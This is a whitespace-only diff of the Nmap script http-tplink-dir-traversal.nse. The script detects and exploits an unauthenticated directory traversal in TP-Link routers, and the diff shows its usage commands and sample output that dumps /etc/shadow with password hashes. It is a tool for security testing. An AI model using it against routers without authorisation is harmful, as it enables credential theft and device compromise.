@@ -1,7 +1,7 @@
 description = [[
 Exploits a directory traversal vulnerability existing in several TP-Link wireless routers. Attackers may exploit this vulnerability to read any of the configuration and password files remotely and without authentication.
 
-This vulnerability was confirmed in models WR740N, WR740ND and WR2543ND but there are several models that use the same HTTP server so I believe they could be vulnerable as well. I appreciate 
+This vulnerability was confirmed in models WR740N, WR740ND and WR2543ND but there are several models that use the same HTTP server so I believe they could be vulnerable as well. I appreciate
 any help confirming the vulnerability in other models.
 
 Advisory:
@@ -16,11 +16,11 @@ Other interesting files:
 -- @usage nmap -p80 --script http-tplink-dir-traversal.nse <target>
 -- @usage nmap -p80 -Pn -n --script http-tplink-dir-traversal.nse <target>
 -- @usage nmap -p80 --script http-tplink-dir-traversal.nse --script-args rfile=/etc/topology.conf -d -n -Pn <target>
--- 
+--
 -- @output
 -- PORT   STATE SERVICE REASON
 -- 80/tcp open  http    syn-ack
--- | http-tplink-dir-traversal: 
+-- | http-tplink-dir-traversal:
 -- |   VULNERABLE:
 -- |   Path traversal vulnerability in several TP-Link wireless routers
 -- |     State: VULNERABLE (Exploitable)
@@ -32,7 +32,7 @@ Other interesting files:
 -- |     Disclosure date: 2012-06-18
 -- |     Extra information:
 -- |       /etc/shadow :
--- |   
+-- |
 -- |   root:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::
 -- |   Admin:$1$$zdlNHiCDxYDfeF4MZL.H3/:10933:0:99999:7:::
 -- |   bin::10933:0:99999:7:::
@@ -46,7 +46,7 @@ Other interesting files:
 -- |   operator:*:10933:0:99999:7:::
 -- |   nobody::10933:0:99999:7:::
 -- |   ap71::10933:0:99999:7:::
--- |   
+-- |
 -- |     References:
 -- |_      http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740
 --
@@ -55,7 +55,7 @@ Other interesting files:
 --
 -- Other arguments you might want to use with this script:
 -- * http.useragent - Sets user agent
--- 
+--
 
 author = "Paulino Calderon <calderon@websec.mx>"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
@@ -112,7 +112,7 @@ action = function(host, port)
 
   local vuln = {
        title = 'Path traversal vulnerability in several TP-Link wireless routers',
-       state = vulns.STATE.NOT_VULN, 
+       state = vulns.STATE.NOT_VULN,
        description = [[
 Some TP-Link wireless routers are vulnerable to a path traversal vulnerability that allows attackers to read configurations or any other file in the device.
 This vulnerability can be exploited without authenticatication.
